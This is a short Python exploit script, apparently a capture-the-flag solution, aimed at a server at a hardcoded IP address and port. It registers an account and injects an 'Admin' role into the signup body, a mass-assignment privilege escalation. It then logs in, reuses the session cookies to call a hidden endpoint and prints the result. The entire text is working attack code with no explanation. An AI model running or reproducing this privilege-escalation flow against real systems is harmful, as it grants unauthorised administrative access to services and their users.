import requests 

url = "http://3.36.69.112:10003"

ID = "helloworldname6"
PW = "helloworldpassword6"

s = requests.session() 
r = s.put( # signup
    f"{url}/fsalke2j9sdfcjlz/MbyMx6EtyTm04EyJezkDTEPDipepro", 
    json={
        "username": ID,
        "password": PW, 
        "userinfo": {
            "role": "Admin"
        }
    }
)

print(r.text) 

r = s.put( # login
    f"{url}/fsalke2j9sdfcjlz/sMo98RyFqT6aKOmcF2NqarIpmrz2ZV",
    json={
        "username": ID,
        "password": PW
    },
    allow_redirects=False
)
cookies = r.cookies.get_dict()
print(cookies) 
r = s.put(
    f"{url}/L0jU3lgokNLUQ7W1nppJ/XXnNWBoD9DWidSaR0aVVFmD8sNeiLz",
    cookies=cookies
)
print(r.status_code) 
print(r.text)